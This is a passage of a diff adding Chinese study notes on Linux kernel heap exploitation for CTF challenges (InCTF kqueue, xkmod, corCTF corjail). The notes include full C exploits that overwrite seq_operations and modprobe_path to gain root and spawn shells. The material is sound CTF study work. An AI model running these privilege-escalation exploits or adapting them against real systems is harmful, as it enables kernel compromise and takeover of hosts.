+            puts(&quot;[-] root fail&quot;);
+        }
+    } else {
+        wait(0);
+    }
+    return 0;
+}
+</code></pre>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-008-cc4e9070c0.png" alt="图片"></p>
+<h2 id="堆溢出-堆喷覆盖-seq_operations-以控制内核执行流">堆溢出 + 堆喷，覆盖 seq_operations 以控制内核执行流</h2>
+<p><a href="https://blog.csdn.net/qq_54218833/article/details/124521291?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172258946616800184152959%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=172258946616800184152959&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-124521291-null-null.nonecase&utm_term=%E5%86%85%E6%A0%B8&spm=1018.2226.3001.4450">InCTF-Kqueue</a>
+只开启了 kaslr，没有开启 KPTI 和 smap&amp;smep。
+所给源码的大致逻辑如下：</p>
+<ul>
+<li>ioctl 根据命令分派到相应函数：添加、删除、编辑或保存。</li>
+<li>create_kqueue 创建一个队列，大致布局如下；这块内存的起始地址保存在 kququs 数组中。</li>
+</ul>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-009-c00ee6fce1.png" alt="图片"></p>
+<pre><code class="language-c"> if(__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&amp;space) == true)
+        err(&quot;[-] Integer overflow&quot;);
+
+    /* Size is the size of queue structure + size of entry * request entries */
+    ull queue_size = 0;
+    if(__builtin_saddll_overflow(sizeof(queue),space,&amp;queue_size) == true)
+        err(&quot;[-] Integer overflow&quot;);
+</code></pre>
+<p>request.max_entries 为 0xffffffff 时，request.max_entries+1 = 0，因此 queue_size = sizeof(queue)，也就是队列只有 queue 本身，没有 entry。</p>
+<ul>
+<li><p>delete_kqueue 根据请求中的 queue_idx 释放对应的 kqueues。</p>
+</li>
+<li><p>edit_kqueue 根据请求中的 queue_idx 定位 queue，再根据 entry_idx 定位 entry，将请求中 data 指向的内容复制到 entry 的 data 指针所指向的位置。</p>
+</li>
+<li><p>首先根据 queue_idx 找到 queue；save_kqueue_entries 分配 queue_size 字节，并将该队列的 queue-&gt;data 和所有 kqueue_entry-&gt;data 存入其中。</p>
+<p>  <code>err(&quot;[-] Entry size limit exceed&quot;);</code> 函数只打印消息，没有其他影响。与前面一样，如果是 0x20，而这里的 data_size 是用户可控参数，data 也是用户参数，就会存在任意长度溢出。</p>
+</li>
+</ul>
+<pre><code class="language-c">   char *new_queue = validate((char *)kzalloc(queue-&gt;queue_size,GFP_KERNEL));
+
+    /* Each saved entry can have its own size */
+    if(request.data_size &gt; queue-&gt;queue_size)
+        err(&quot;[-] Entry size limit exceed&quot;);
+
+    /* Copy main&#39;s queue&#39;s data */
+    if(queue-&gt;data &amp;&amp; request.data_size)
+        validate(memcpy(new_queue,queue-&gt;data,request.data_size));
+    else
+  
+</code></pre>
+<p>这道题的利用依赖一个结构体：seq_operations，大小为 0x20（与 queue 相同），包含 4 个指针：</p>
+<pre><code class="language-c">struct seq_operations {
+	void * (*start) (struct seq_file *m, loff_t *pos);
+	void (*stop) (struct seq_file *m, void *v);
+	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
+	int (*show) (struct seq_file *m, void *v);
+}
+</code></pre>
+<p>该结构体是序列文件的关键，作用类似迭代器，可以循环输出某些内容，通常用于导出数据和记录，以管理大型数据文件。打开定义了该结构体的 LKM 时（例如使用 cat 命令或 read），内核会创建这样的数据结构，并首先调用 start 函数指针。由于该结构体大小为 0x20，很可能被分配在上面的 queue 附近。如果能控制这里的 start 指针，就能控制内核执行流。本题打开的序列文件为 /proc/self/stat。</p>
+<p>这里通过 <code>open(&quot;/proc/self/stat&quot;, O_RDONLY);</code> 堆喷一批大小为 0x20 的 chunk，再释放中间的一个。此时某个已分配 chunk 可能恰好位于释放对象之后（但并没有），因此对所有已打开的描述符尝试 read。
+<img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-010-8907268c2c.png" alt="图片">
+调用 start 前，内核会将下一条指令的地址压栈。正是利用这个地址得到内核加载基址，再通过偏移调用 commit_cred(prepare_kernel_cred(NULL))。</p>
+<p>不过，由于劫持的是函数指针，函数开头仍有一个 <code>push rbp</code>，所以泄露的地址位于 rsp+8。然后给泄露地址加上相关偏移，再通过 <code>call reg</code> 调用函数。
+<img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-011-9ccc31f4dd.png" alt="图片"></p>
+<h3 id="exp-3">exp</h3>
+<pre><code class="language-c">#define _GNU_SOURCE
+#include &lt;fcntl.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/types.h&gt;
+
+typedef struct{
+    uint32_t max_entries;
+    uint16_t data_size;
+    uint16_t entry_idx;
+    uint16_t queue_idx;
+    char* data;
+}request_t;
+
+void create_kqueue(int fd,uint32_t max_entries,uint16_t data_size)
+{
+    request_t request={
+        .max_entries=max_entries,
+        .data_size=data_size,
+    };
+    ioctl(fd,0xDEADC0DE,&amp;request);
+}
+
+void edit_kqueue(int fd,uint16_t entry_idx,uint16_t queue_idx,char* data)
+{
+    request_t request={
+        .queue_idx=queue_idx,
+        .entry_idx=entry_idx,
+        .data=data,
+    };
+    ioctl(fd,0xDAADEEEE,&amp;request);
+}
+
+void save_kqueue(int fd,uint32_t max_entries,uint16_t data_size,uint16_t queue_idx)
+{
+    request_t request={
+        .max_entries=max_entries,
+        .data_size=data_size,
+        .queue_idx=queue_idx,
+    };
+    ioctl(fd,0xB105BABE,&amp;request);
+}
+void shell()
+{
+    __asm__(
+            &quot;mov r12, [rsp + 0x8];&quot;
+            &quot;sub r12, 0x201179;&quot;
+            &quot;mov r13, r12;&quot;
+            &quot;add r12, 0x8c580;&quot;// prepare_kernel_cred
+            &quot;add r13, 0x8c140;&quot;// commit_creds
+            &quot;xor rdi, rdi;&quot;
+            &quot;call r12;&quot;
+            &quot;mov rdi, rax;&quot;
+            &quot;call r13;&quot;
+            &quot;swapgs;&quot;
+            &quot;push user_ss;&quot;
+            &quot;push user_sp;&quot;
+            &quot;push user_rflags;&quot;
+            &quot;push user_cs;&quot;
+            &quot;push user_rip;&quot;
+            &quot;iretq;&quot;);
+}
+// typedef struct{
+//     uint16_t data_size;
+//     uint64_t queue_size; /* This needs to handle larger numbers */
+//     uint32_t max_entries;
+//     uint16_t idx;
+//     char* data;
+// }queue;
+void get_shell()
+{
+    system(&quot;/bin/sh&quot;);
+}
+size_t user_cs, user_rflags, user_sp, user_ss, user_rip = (size_t) get_shell;
+void save_status() {
+    __asm__(&quot;mov user_cs, cs;&quot;
+            &quot;mov user_ss, ss;&quot;
+            &quot;mov user_sp, rsp;&quot;
+            &quot;pushf;&quot;
+            &quot;pop user_rflags;&quot;);
+    puts(&quot;[*] status has been saved.&quot;);
+}
+
+int main()
+{
+    save_status();
+    int fd1=open(&quot;/dev/kqueue&quot;,O_RDONLY);
+    create_kqueue(fd1,0xffffffff,0x40);
+    size_t * shellcode=malloc(0x40);
+    for(int i=0;i&lt;8;i++)
+    {
+        shellcode[i]=shell;
+    }
+    
+    edit_kqueue(fd1,0,0,shellcode);
+    int seq_fd[0x100];
+    for(int i=0;i&lt;0x100;i++)
+    {
+        seq_fd[i]=open(&quot;/proc/self/stat&quot;, O_RDONLY);
+    }
+    close(seq_fd[0x50]);
+    
+    save_kqueue(fd1,0xffffffff,0x40,0);
+    
+     for(int i=0;i&lt;0x100;i++)
+    {
+       read(seq_fd[i], shellcode, 1); 
+    }
+     
+    return 0;
+}
+</code></pre>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-012-e85b129945.png" alt="图片"></p>
+<h1 id="任意地址分配freelist-劫持">任意地址分配（freelist 劫持）</h1>
+<h2 id="通过-modprobe_path-提权">通过 modprobe_path 提权</h2>
+<p><a href="https://h0pe-ay.github.io/%E5%88%A9%E7%94%A8modprobe_path%E6%8F%90%E6%9D%83/">https://h0pe-ay.github.io/%E5%88%A9%E7%94%A8modprobe_path%E6%8F%90%E6%9D%83/</a>
+modprobe_path 保存名为 modprobe 的程序路径，该程序用于向 Linux 内核添加可加载内核模块，或从内核中移除模块。</p>
+<p>执行文件头无效的文件时，会调用 modprobe_path 指向的程序。调用路径如下：</p>
+<pre><code class="language-bash">entry_SYSCALL_64()
+    sys_execve()
+        do_execve()
+            do_execveat_common()
+                bprm_execve()
+                    exec_binprm()
+                        search_binary_handler()
+                            __request_module() // wrapped as request_module
+                                call_modprobe()
+</code></pre>
+<p>call_modprobe() 定义在 kernel/kmod.c 中；重点看这部分代码（下面来自内核 5.14 源码）：</p>
+<pre><code class="language-c">static int call_modprobe(char *module_name, int wait)
+{
+    //...
+    argv[0] = modprobe_path;
+    argv[1] = &quot;-q&quot;;
+    argv[2] = &quot;--&quot;;
+    argv[3] = module_name;  /* check free_modprobe_argv() */
+    argv[4] = NULL;
+
+    info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
+                     NULL, free_modprobe_argv, NULL);
+    if (!info)
+        goto free_module_name;
+
+    return call_usermodehelper_exec(info, wait | UMH_KILLABLE);
+    //...
+</code></pre>
+<p>这里，call_usermodehelper_exec() 以 root 权限执行 modprobe_path 所指向的可执行文件。该地址处默认保存的值为 /sbin/modprobe。</p>
+<pre><code class="language-bash">cat /proc/kallsyms  | grep modprobe_path
+或者
+search /sbin/modprobe
+</code></pre>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-013-03bc8de5da.png" alt="图片"></p>
+<ul>
+<li>接下来，程序需要任意地址写原语，用于将待执行程序的路径写入 modprobe_path。</li>
+<li>构造无效文件头，例如 ffffffff，迫使内核进入 call_modprobe 函数。</li>
+</ul>
+<h2 id="利用">利用</h2>
+<blockquote>
+<p>先按 Ctrl+A，再按 C：切换到 QEMU Monitor 模式。
+应使用 -monitor none 参数禁用 Monitor。
+也可以使用 -monitor /dev/null，将 Monitor 重定向到 /dev/null。</p>
+</blockquote>
+<pre><code class="language-bash">cat /sys/devices/system/cpu/vulnerabilities/*查看开了KPTI
+kaslr smep smap都开了
+</code></pre>
+<p>调用 kmem_cache_create 创建新 cache 时，内核首先检查是否已存在特征相同的 cache。如果找到匹配项，就返回现有 cache，不创建新 cache。这里没有设置 SLAB_ACCOUNT，因此返回现有 cache。</p>
+<p>调试时记得修改 <code>rdinit=/init</code>；这里的 init 是自己创建的，参考其中相关 init 即可，最后以 root 身份启动。</p>
+<pre><code class="language-c">void __fastcall xkmod_ioctl(__int64 a1, int cmd, char *data)
+{
+  void *p_input; // rdi
+  char *v5; // rsi
+  struct input input; // [rsp+0h] [rbp-20h] BYREF
+  unsigned __int64 v7; // [rsp+10h] [rbp-10h]
+
+  v7 = __readgsqword(0x28u);
+  if ( data )
+  {
+    p_input = &amp;input;
+    v5 = data;
+    copy_from_user(&amp;input, data, 16LL);
+    if ( cmd == 107374182 )
+    {
+      p_input = buf;
+      if ( buf &amp;&amp; input.len &lt;= 0x50u &amp;&amp; input.offset &lt;= 0x70u )
+      {
+        copy_from_user(&amp;buf[input.offset], input.user_buf, (int)input.len);
+        return;
+      }
+    }
+    else
+    {
+      if ( cmd != 125269879 )
+      {
+        if ( cmd == 17895697 )
+          buf = (char *)kmem_cache_alloc(s, 3264LL);
+        return;
+      }
+      v5 = buf;
+      if ( buf &amp;&amp; input.len &lt;= 0x50u &amp;&amp; input.offset &lt;= 0x70u )
+      {
+        copy_to_user(input.user_buf, &amp;buf[input.offset], (int)input.len);
+        return;
+      }
+    }
+    xkmod_ioctl_cold((__int64)p_input, (__int64)v5);
+  }
+}
+
+int __fastcall xkmod_release(inode *inode, file *file)
+{
+  return kmem_cache_free(s, buf);
+}
+</code></pre>
+<p>close 后没有清空 buf，因此仍然可以修改 buf 或泄露其中的内容。</p>
+<ul>
+<li><p>打开多个 <code>/dev/xkmod</code> 实例。</p>
+</li>
+<li><p>使用第一个描述符执行添加，然后关闭。</p>
+</li>
+<li><p>使用第二个描述符读取，泄露对象地址，再通过异或得到堆基址。</p>
+</li>
+<li><p>使用第二个描述符写入，将 freelist 设为 (page_offset_base) + 0x9d00 - 0x10（该地址对应的 freelist 为 NULL，因此系统会向伙伴系统申请新 slab；否则，若 freelist 无效，内核会 panic）。<img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-014-cd6ee53369.png" alt="图片"></p>
+</li>
+<li><p>使用第二个描述符添加两次；此时 buf 为 (page_offset_base) + 0x9d00 - 0x10，通过 read 可以泄露内核基址。</p>
+</li>
+<li><p>使用第二个描述符执行添加，然后关闭。</p>
+</li>
+<li><p>使用第三个描述符写入，将 freelist 设为 modprobe_path - 0x10（同样为了保证 freelist 为 NULL）。
+<img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-015-c3f743cf9b.png" alt="图片"></p>
+</li>
+<li><p>使用第三个描述符添加两次；此时 buf 为 modprobe_path - 0x10，然后向其中写入恶意脚本的路径。</p>
+</li>
+<li><p>随后创建一个格式错误的文件；执行它就会跳转到恶意脚本，将 flag 的权限改为 777（恶意脚本以 root 权限运行）。</p>
+</li>
+<li><p>再启动 shell 读取 flag。</p>
+</li>
+</ul>
+<h3 id="exp-4">exp</h3>
+<pre><code class="language-c">#ifndef _GNU_SOURCE
+#define _GNU_SOURCE
+#endif
+
+#include &lt;asm/ldt.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;ctype.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;linux/keyctl.h&gt;
+#include &lt;linux/userfaultfd.h&gt;
+#include &lt;poll.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;semaphore.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;stdbool.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/msg.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;sys/sem.h&gt;
+#include &lt;sys/shm.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/xattr.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/io.h&gt;
+
+size_t modprobe_path = 0xFFFFFFFF82444700;
+
+void qword_dump(char *desc, void *addr, int len) {
+    uint64_t *buf64 = (uint64_t *) addr;
+    uint8_t *buf8 = (uint8_t *) addr;
+    if (desc != NULL) {
+        printf(&quot;[*] %s:\n&quot;, desc);
+    }
+    for (int i = 0; i &lt; len / 8; i += 4) {
+        printf(&quot;  %04x&quot;, i * 8);
+        for (int j = 0; j &lt; 4; j++) {
+            i + j &lt; len / 8 ? printf(&quot; 0x%016lx&quot;, buf64[i + j]) : printf(&quot;                   &quot;);
+        }
+        printf(&quot;   &quot;);
+        for (int j = 0; j &lt; 32 &amp;&amp; j + i * 8 &lt; len; j++) {
+            printf(&quot;%c&quot;, isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : &#39;.&#39;);
+        }
+        puts(&quot;&quot;);
+    }
+}
+
+void bind_core(int core) {
+    cpu_set_t cpu_set;
+    CPU_ZERO(&amp;cpu_set);
+    CPU_SET(core, &amp;cpu_set);
+    sched_setaffinity(getpid(), sizeof(cpu_set), &amp;cpu_set);
+}
+
+struct Data {
+    size_t *buf;
+    u_int32_t offset;
+    u_int32_t size;
+};
+
+void alloc_buf(int fd, struct Data *data) {
+    ioctl(fd, 0x1111111, data);
+}
+
+void write_buf(int fd, struct Data *data) {
+    ioctl(fd, 0x6666666, data);
+}
+
+void read_buf(int fd, struct Data *data) {
+    ioctl(fd, 0x7777777, data);
+}
+
+int main() {
+    bind_core(0);
+
+    int xkmod_fd[5];
+    for (int i = 0; i &lt; 3; i++) {
+        xkmod_fd[i] = open(&quot;/dev/xkmod&quot;, O_RDONLY);
+        if (xkmod_fd[i] &lt; 0) {
+            printf(&quot;[-] %d Failed to open xkmod.&quot;, i);
+            exit(-1);
+        }
+    }
+
+    struct Data data = {malloc(0x1000), 0, 0x50};
+    alloc_buf(xkmod_fd[0], &amp;data);
+    close(xkmod_fd[0]);
+
+    read_buf(xkmod_fd[1], &amp;data);
+    qword_dump(&quot;buf&quot;, data.buf, 0x50);
+
+    size_t page_offset_base = data.buf[0] &amp; 0xFFFFFFFFF0000000;
+    printf(&quot;[+] page_offset_base: %p\n&quot;, page_offset_base);
+
+
+    data.buf[0] = page_offset_base + 0x9d000 - 0x10;
+    write_buf(xkmod_fd[1], &amp;data);
+    alloc_buf(xkmod_fd[1], &amp;data);
+    alloc_buf(xkmod_fd[1], &amp;data);
+
+    data.size = 0x50;
+    read_buf(xkmod_fd[1], &amp;data);
+    qword_dump(&quot;buf&quot;, data.buf, 0x50);
+    
+    size_t kernel_offset = data.buf[2] - 0xffffffff81000030;
+    printf(&quot;kernel offset: %p\n&quot;, kernel_offset);
+    modprobe_path += kernel_offset;
+
+    close(xkmod_fd[1]);
+    data.buf[0] = modprobe_path - 0x10;
+    write_buf(xkmod_fd[2], &amp;data);
+    alloc_buf(xkmod_fd[2], &amp;data);
+    alloc_buf(xkmod_fd[2], &amp;data);
+    strcpy((char *) &amp;data.buf[2], &quot;/home/shell.sh&quot;);
+    write_buf(xkmod_fd[2], &amp;data);
+
+    if (open(&quot;/shell.sh&quot;, O_RDWR) &lt; 0) {
+        system(&quot;echo &#39;#!/bin/sh&#39; &gt;&gt; /home/shell.sh&quot;);
+        system(&quot;echo &#39;chmod 777 /flag&#39; &gt;&gt; /home/shell.sh&quot;);
+        system(&quot;chmod +x /home/shell.sh&quot;);
+    }
+    system(&quot;echo -e &#39;\\xff\\xff\\xff\\xff&#39; &gt; /home/fake&quot;);
+    system(&quot;chmod +x /home/fake&quot;);
+    system(&quot;/home/fake&quot;);
+    if (open(&quot;/flag&quot;, O_RDWR) &lt; 0) {
+        puts(&quot;[-] Failed to hijack!&quot;);
+        _exit(-1);
+    }
+    puts(&quot;[+] hijack success&quot;);
+    system(&quot;/bin/sh&quot;);
+
+    return 0;
+}
+</code></pre>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-016-0e1194b3b6.png" alt="图片"></p>
+<h1 id="空字节越界off-by-null">空字节越界（Off By Null）</h1>
+<p>题目：corCTF2022 corjail（kmalloc-4k）
+<a href="https://blog.csdn.net/panhewu9919/article/details/127804902">https://blog.csdn.net/panhewu9919/article/details/127804902</a>
+<a href="https://xz.aliyun.com/t/12488?time__1311=GqGxRQqiqmw4lrzG7Dy7QDkDcmoOI6fQ3x">https://xz.aliyun.com/t/12488?time__1311=GqGxRQqiqmw4lrzG7Dy7QDkDcmoOI6fQ3x</a></p>
+<h2 id="调试">调试</h2>
+<blockquote>
+<p>感谢 tplus 和 Nightu 两位师傅的帮助！！！</p>
+</blockquote>
+<p>Intel 不支持运行：<code>qemu-system-x86_64: warning: host doesn&#39;t support requested feature: CPUID.80000001H:ECX.svm [bit 2]</code>。Nightu 师傅建议使用 -cpu max；如果仍然不行，就没办法了。因此这里只分析思路和 exp。</p>
+<ul>
+<li>修改 qcow 镜像中的 root 权限</li>
+</ul>
+<ol>
+<li><p>内核命令行（cmdline）：
+这是启动时传给内核的参数列表，可以在引导加载器（如 GRUB）的配置中设置。</p>
+</li>
+<li><p>init 系统的选择：</p>
+<ul>
+<li>如果 cmdline 中没有指定 init 系统，内核会按以下顺序尝试查找并执行 init 程序：
+a) /sbin/init
+b) /etc/init
+c) /bin/init
+d) /bin/sh</li>
+</ul>
+</li>
+<li><p>systemd:</p>
+<ul>
+<li>如果系统使用 systemd，/sbin/init 通常是指向 systemd 可执行文件的符号链接。</li>
+<li>可以在 cmdline 中显式指定 systemd，例如：<code>init=/lib/systemd/systemd</code></li>
+</ul>
+</li>
+</ol>
+<p>题目需要 ext4 文件系统，可以使用 <a href="https://github.com/google/syzkaller/blob/master/tools/create-image.sh">create-image.sh</a> 制作</p>
+<h2 id="漏洞">漏洞</h2>
+<p>开启了全部保护。</p>
+<p>题目 readme 要求操作 <code>/proc_rw/cormon</code>；虽然 <code>/proc/cormon</code> 也存在，这里仍按题目说明操作。</p>
+<p>写入 <code>/proc/cormon</code> 时，cormon_proc_write 存在 off-by-one 溢出。</p>
+<pre><code class="language-c">static ssize_t cormon_proc_write(struct file *file, const char __user *ubuf, size_t count, loff_t *ppos) 
+{
+    loff_t offset = *ppos;
+    char *syscalls;
+    size_t len;
+
+    if (offset &lt; 0)
+        return -EINVAL;
+
+    if (offset &gt;= PAGE_SIZE || !count)
+        return 0;
+
+    len = count &gt; PAGE_SIZE ? PAGE_SIZE - 1 : count;
+	//count 等于PAGE_SIZE 时就是原值，
+    syscalls = kmalloc(PAGE_SIZE, GFP_ATOMIC);
+    printk(KERN_INFO &quot;[CoRMon::Debug] Syscalls @ %#llx\n&quot;, (uint64_t)syscalls);
+
+    if (!syscalls)
+    {
+        printk(KERN_ERR &quot;[CoRMon::Error] kmalloc() call failed!\n&quot;);
+        return -ENOMEM;
+    }
+
+    if (copy_from_user(syscalls, ubuf, len)) //复制PAGE_SIZE大小
+    {
+        printk(KERN_ERR &quot;[CoRMon::Error] copy_from_user() call failed!\n&quot;);
+        return -EFAULT;
+    }
+
+    syscalls[len] = &#39;\x00&#39;;  // 多一个出来
+
+    if (update_filter(syscalls))
+    {
+        kfree(syscalls);
+        return -EINVAL;
+    }
+    
+    kfree(syscalls);  //释放掉PAGE_SIZE 大小的object
+
+    return count;
+}
+</code></pre>
+<h2 id="利用-1">利用</h2>
+<p>页级 cache 中的 off-by-one 溢出会将相邻地址处对象的最低字节清零。如果相邻对象的前八字节也指向一个对象，且覆盖后指向已释放对象，就可能造成 UAF。</p>
+<h3 id="poll">poll</h3>
+<p><code>poll</code> 函数是一种多路复用技术，用于监视多个文件描述符（通常是 socket 或管道），判断是否有数据可读、是否可写，或是否发生错误。</p>
+<ol>
+<li><p><strong>监视多个文件描述符</strong>：<code>poll</code> 可以同时监视多个文件描述符的状态变化，这些描述符可以是已打开文件、网络 socket 等。</p>
+</li>
+<li><p><strong>事件检测</strong>：它可以检测不同的事件类型，例如：</p>
+<ul>
+<li><strong>POLLIN</strong>：有数据可读。</li>
+<li><strong>POLLOUT</strong>：可以写入数据。</li>
+<li><strong>POLLERR</strong>：发生错误。</li>
+<li><strong>POLLHUP</strong>：挂断事件（对端关闭连接）。</li>
+</ul>
+</li>
+</ol>
+<p>使用 <code>poll</code> 函数的典型步骤如下：</p>
+<ol>
+<li>初始化 <code>pollfd</code> 结构体数组（每个结构体对应一个文件描述符）。</li>
+<li>设置需要监视的事件类型。</li>
+<li>调用 <code>poll</code> 函数，传入 <code>pollfd</code> 数组、数组大小和超时时间。</li>
+<li><code>poll</code> 返回后，检查 <code>revents</code> 字段在每个 <code>pollfd</code> 结构体中的值，判断哪些文件描述符发生了关注的事件。</li>
+</ol>
+<pre><code class="language-c">//int poll(struct pollfd fds[], nfds_t nfds, int timeout); 
+//fds:一个pollfd结构的数组
+//nfds:表示&#39;fds&#39;数组中的文件描述符数量
+//timeout:表示超时时间，单位是毫秒
+#include &lt;poll.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+    struct pollfd fds[2];
+    int timeout_msecs = 5000; // 5秒超时
+    int ret;
+
+    // 假设我们有两个文件描述符fd1和fd2
+    int fd1 = ...; // 打开文件或套接字
+    int fd2 = ...; // 打开文件或套接字
+
+    fds[0].fd = fd1;
+    fds[0].events = POLLIN; // 监控可读事件
+
+    fds[1].fd = fd2;
+    fds[1].events = POLLIN; // 监控可读事件
+
+    ret = poll(fds, 2, timeout_msecs); //监控5秒钟
+
+    if (ret &gt; 0) {
+        if (fds[0].revents &amp; POLLIN) {
+            // fd1 有数据可读
+        }
+        if (fds[1].revents &amp; POLLIN) {
+            // fd2 有数据可读
+        }
+    } else if (ret == 0) {
+        // 超时，没有文件描述符变为可操作状态
+    } else {
+        // 发生错误
+    }
+
+    return 0;
+}
+</code></pre>
+<p>使用 poll 函数监视一个或多个文件描述符的活动时，内核空间会分配用于存放 poll_list 的空间，通过 poll_list 的 entries 保存 pollfd 描述符。前 30 个 pollfd 组成的 poll_list 放在栈上；后续则分配到各自最多容纳 510 个 pollfd 的 poll_list 对象中，因此对象的分配大小范围为 32 到 4096。</p>
+<p>分配完所有 poll_list 对象后，调用 do_poll，监视所提供的文件描述符，直到特定事件发生或计时器超时。</p>
+<p>随后，while 循环根据 poll_list-&gt;next 是否为 NULL 遍历 poll_list 单链表，并依次释放结构体。</p>
+<pre><code class="language-c">struct poll_list {
+    struct poll_list *next; // 指向下一个poll_list
+    int len; // 对应于条目数组中pollfd结构的数量
+    struct pollfd entries[]; // 存储pollfd结构的数组
+};
+</code></pre>
+<h3 id="初始化">初始化</h3>
+<ul>
+<li>使用 assign_to_core() 将当前进程绑定到 CPU0，因为这里是多核环境，slab 按 CPU 分配。</li>
+<li>大量堆喷 seq_operations，填满 kmalloc-32。将只有少量对象或对象不多的 kmalloc-32 cache 填入 full 链表，使其申请新页来存放 kmalloc-32，因为后面需要保证 kmalloc-32 的 poll_list 和 kmalloc-32 的 user_key_payload 位于同一页。</li>
+</ul>
+<h3 id="堆喷-poll_list-和-user_key_payload">堆喷 poll_list 和 user_key_payload</h3>
+<ul>
+<li>选择包含 30+510+1 个文件描述符的 poll_list，这样会同时喷射 kmalloc-4096 和 kmalloc-32 对象。之前没有喷 kmalloc-4096 的原因，可能是一个 slab 只能容纳 8 个 kmalloc-4096 对象，并且由于保护机制，freelist 中的条目并不相邻。因此，喷射一段时间 kmalloc-4096 后，分配基本都会落在新 slab 上；于是 cormon_proc_write 分配一个 kmalloc-4096，随后 poll_list 填满该 slab 时，两者就很可能相邻。</li>
+<li>随后，kmalloc-32 的 poll_list 可能与之前堆喷的 kmalloc-32 user_key_payload 落在同一页。图中黄色为 user_key_payload，绿色为 poll_list，蓝色为 cormon_proc_write 分配的一个 kmalloc-4096，红色为被溢出的 poll_list。溢出将 poll_list 的低字节改为 \x00，使原本指向 kmalloc-32 中某个 poll_list 的 next，转而指向同一页上之前堆喷产生的另一个 user_key_payload。
+<img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-017-9636b48a9d.png" alt="图片"></li>
+<li>poll 函数结束时，会沿 next 释放所有已分配的 poll_list。此时被溢出对象的 next 指向 user_key_payload，因此该 user_key_payload 会被释放，但仍然可用，从而造成 UAF。<blockquote>
